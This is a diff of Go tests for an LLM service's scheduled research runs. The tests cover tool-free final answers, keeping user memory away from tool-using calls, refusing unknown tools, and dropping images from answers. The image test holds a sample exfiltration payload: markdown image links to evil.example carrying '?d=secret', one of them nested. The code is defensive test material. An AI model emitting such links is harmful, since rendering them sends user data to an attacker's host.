@@ -124,6 +124,19 @@ func TestScheduledRunReportsOnlyWhatIsNew(t *testing.T) {
 	if !strings.Contains(last, "Already reported") || !strings.Contains(last, "Dune: Part Three") || !strings.Contains(last, "arena.ch/programm: 1 finds") {
 		t.Fatalf("second run's prompt lacks the memory:\n%s", last)
 	}
+	// Reported items were named by answers that saw the user memory: they
+	// reach only the tool-free call, while the learned sources reach every one.
+	for i, history := range client.Histories {
+		if len(client.Tools[i]) == 0 {
+			continue
+		}
+		if strings.Contains(history[0].Content, "Already reported") {
+			t.Fatalf("call %d offers tools and lists the reported items", i)
+		}
+		if i > 2 && !strings.Contains(history[0].Content, "arena.ch/programm: 1 finds") {
+			t.Fatalf("call %d of the second run lacks the learned sources", i)
+		}
+	}
 	if known := f.sllm.known[1]; len(known) != 1 || known[0] != "dune-part-three" {
 		t.Fatalf("known keys = %v", known)
 	}
@@ -171,8 +184,9 @@ func TestScheduledRunRefusesToolsOutsideItsSet(t *testing.T) {
 	if list, _ := f.store.ListSchedules(ctx, testUser.ID); len(list) != 1 {
 		t.Fatalf("a scheduled run created a schedule: %+v", list)
 	}
-	last := client.Histories[len(client.Histories)-1]
-	for _, m := range last[len(last)-2:] {
+	// The round after the refused calls saw why they did not run.
+	next := client.Histories[1]
+	for _, m := range next[len(next)-2:] {
 		if !strings.Contains(m.Content, "unknown tool") {
 			t.Fatalf("the model was not told the tool is unknown: %+v", m)
 		}
@@ -263,22 +277,35 @@ func TestScheduledRunIgnoresAProjectItsThreadWasMovedInto(t *testing.T) {
 	}
 }
 
-func TestScheduledRunWithoutMemoryKeepsItsAnswer(t *testing.T) {
+func TestScheduledRunAnswersFromTheToolFreeCall(t *testing.T) {
 	ctx := context.Background()
 	f := newScheduleFixture(t)
-	client := &fakeToolChatClient{Results: researchRound("Nothing new.")}
+	client := &fakeToolChatClient{Results: researchRound("DONE"), Plain: "Nothing new."}
 	s := newRunnerServer(t, f, client)
-	s.runSchedule(ctx, newRunnerSchedule(t, f))
-	if len(client.Histories) != 2 {
-		t.Fatalf("model calls = %d, want the research round and its answer only", len(client.Histories))
+	sch := newRunnerSchedule(t, f)
+	s.runSchedule(ctx, sch)
+	// The research round, the round that ends it, the answer: no more.
+	if len(client.Histories) != 3 || len(client.Tools[2]) != 0 {
+		t.Fatalf("model calls = %d, want two research rounds and one tool-free answer", len(client.Histories))
+	}
+	if !strings.Contains(client.Histories[0][0].Content, "reply with the single word DONE") {
+		t.Fatal("the research rounds are not told to leave the answer to the final call")
+	}
+	if strings.Contains(client.Histories[2][0].Content, "single word DONE") {
+		t.Fatal("the call that writes the answer is told to reply DONE")
+	}
+	got, _ := f.store.GetSchedule(ctx, testUser.ID, sch.ID)
+	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, *got.ThreadID)
+	if answer := messages[len(messages)-1].Content; answer != "Nothing new." {
+		t.Fatalf("answer = %q, want the tool-free call's", answer)
 	}
 }
 
 func TestScheduledAnswerDropsImages(t *testing.T) {
 	ctx := context.Background()
 	f := newScheduleFixture(t)
-	client := &fakeToolChatClient{Results: researchRound(
-		"New: a talk ![poster](https://evil.example/p.png?d=secret) and ![![x](y)](https://evil.example/?d=nested), see [the page](https://arena.ch/programm).")}
+	client := &fakeToolChatClient{Results: researchRound("DONE"),
+		Plain: "New: a talk ![poster](https://evil.example/p.png?d=secret) and ![![x](y)](https://evil.example/?d=nested), see [the page](https://arena.ch/programm)."}
 	s := newRunnerServer(t, f, client)
 	sch := newRunnerSchedule(t, f)
 	s.runSchedule(ctx, sch)
@@ -298,13 +325,19 @@ func TestScheduledAnswerDropsImages(t *testing.T) {
 
 func TestScheduledRunOffersCategoryServersOnlyWhenTheyFit(t *testing.T) {
 	for _, c := range []struct {
-		category string
-		context7 bool
-	}{{"recent_news", false}, {"coding", true}} {
-		t.Run(c.category, func(t *testing.T) {
+		name, category string
+		err            error
+		context7       bool
+	}{
+		{"recent news", "recent_news", nil, false},
+		{"coding", "coding", nil, true},
+		// A failed classification keeps every server rather than a guess.
+		{"failed", "general", errors.New("gate timeout"), true},
+	} {
+		t.Run(c.name, func(t *testing.T) {
 			ctx := context.Background()
 			f := newScheduleFixture(t)
-			client := &fakeToolChatClient{Results: researchRound("Nothing new."), ClassifyResult: c.category}
+			client := &fakeToolChatClient{Results: researchRound("Nothing new."), ClassifyResult: c.category, ClassifyErr: c.err}
 			deps := f.deps
 			deps.LLM = client
 			deps.MCP = &fakeMCPService{ToolList: peeqTools(), ToolCategories: map[string][]string{"context7__docs": {"coding"}}, Result: "page"}
